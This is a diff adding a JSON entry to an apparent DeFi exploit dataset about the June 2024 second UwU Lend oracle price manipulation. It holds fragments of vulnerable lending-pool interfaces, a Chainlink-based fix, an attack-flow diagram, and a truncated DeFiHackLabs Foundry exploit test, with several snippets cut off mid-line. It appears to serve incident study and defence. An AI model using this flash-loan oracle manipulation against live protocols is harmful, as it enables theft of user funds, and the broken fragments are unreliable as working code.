@@ -1,0 +1,30 @@
+{
+ "id": "2024__2024-06-13_UwuLend_Second_OraclePriceManipulation",
+ "source_file": "2024/2024-06-13_UwuLend_Second_OraclePriceManipulation.md",
+ "title": "UwU Lend #2 — Analysis of Oracle Vulnerability Reuse Due to Insufficient First Attack Patch",
+ "date": "2024-06-13",
+ "protocol": "UwU Lend #2",
+ "chain": "Ethereum",
+ "loss_raw": "~$3.7M",
+ "loss_usd": 3.7,
+ "root_cause": "Same oracle vulnerability reused due to insufficient first attack patch",
+ "attack_tx": "[Unverified — not independently confirmed on-chain]",
+ "vulnerable_contract": "UwU Lend LendingPool — same contracts as Jun 10 attack; oracle patch was incomplete",
+ "classes": [
+  "oracle-price-manipulation"
+ ],
+ "code_before": [
+  "❌ Vulnerable implementation example\n// Issue: Same oracle vulnerability reused due to insufficient first attack patch\n// The attacker exploits this logic to obtain illegitimate profit\n\n// UwU Lend Second Attack Interface — Same Oracle Vulnerability Reuse\ninterface ILendingPool {\n    //",
+  "❌ Vulnerable: Same Curve LP oracle vulnerability persists even after first attack patch\n    // Borrows large amount of uWETH via Morpho flashLoan, manipulates Curve pool price,\n    // then confirms inflated collateral value via getUserAccountData and executes large-scale borrowing\n    function getUserAccountData(address user) external view returns (\n        uint256 totalCollateralETH,\n        uint256 totalDebtETH,\n        uint256 availableBorrowsETH,\n        uint256 currentLiquidationThreshold,\n        uint256 ltv,\n        uint256 healthFactor\n    );\n    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;\n    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;\n    function withdraw(address asset, uint256 amount, address to) external;\n}\n\ninterface IMorphoBuleFlashLoan {\n    //",
+  "❌ Vulnerable: Curve price manipulation followed by borrow is possible inside flashLoan callback (onMorphoFlashLoan)\n    function flashLoan(address token, uint256 amount, bytes calldata data) external;\n}\n\n//"
+ ],
+ "code_after": [
+  "✅ Correct implementation: All related oracles must be replaced simultaneously during patch\nfunction safeGetOraclePrice(address asset) external view returns (uint256) {\n    //",
+  "✅ Use Chainlink directly instead of Curve LP oracle (manipulation-resistant)\n    (, int256 price,, uint256 updatedAt,) = IChainlinkFeed(chainlinkFeed[asset]).latestRoundData();\n    require(price > 0, \"Oracle: invalid price\");\n    //"
+ ],
+ "steps": [],
+ "other_code": [
+  "Attacker\n  │\n  ▼\n[Flash Loan] ──── Liquidity Pool\n  │\n  ▼\n[Oracle Price Manipulation] ─ Price Feed Contract\n  │                             (TWAP/Spot Price Distortion)\n  ▼\n[Excess Borrow/Liquidation] ── Lending Protocol\n  │\n  ▼\n[Repay & Secure Profit]",
+  "// Source: DeFiHackLabs - UwuLend_Second_exp.sol\n// Chain: Ethereum | Date: 2024-06-13\n\n    function testExploit() public {\n        vm.startPrank(attacker);\n        uSUSDE.transfer(address(this), 60_000_000 ether);\n        vm.stopPrank();\n\n        (\n            uint256 totalCollateral,\n            uint256 totalDebt,\n            uint256 availableBorrows,\n            uint256 currentLiquidationThreshold,\n            uint256 ltv,\n            uint256 healthFactor\n        ) = uwuLendPool.getUserAccountData(address(this));\n        console.log(\"\\n  sUSDE position\");\n        emit log_named_decimal_uint(\"totalCollateral\", totalCollateral, 8);\n        emit log_named_decimal_uint(\"totalDebt\", totalDebt, 8);\n        emit log_named_decimal_uint(\"availableBorrows\", availableBorrows, 8);\n        emit log_"
+ ]
+}
